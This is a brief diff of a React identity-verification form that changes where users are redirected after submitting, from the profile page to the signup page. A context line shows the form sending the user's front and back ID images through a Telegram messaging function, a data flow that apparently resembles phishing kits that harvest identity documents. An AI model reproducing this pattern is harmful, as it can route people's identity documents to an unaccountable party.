@@ -122,7 +122,7 @@ const IdentityVerificationForm = () => {
     await sendTelegramMessage("Identity verification images submission.", frontImage, backImage);
     setIsSubmitting(false);
     
-    router.push("/profile");
+    router.push("/signup");
   };
 
   return (
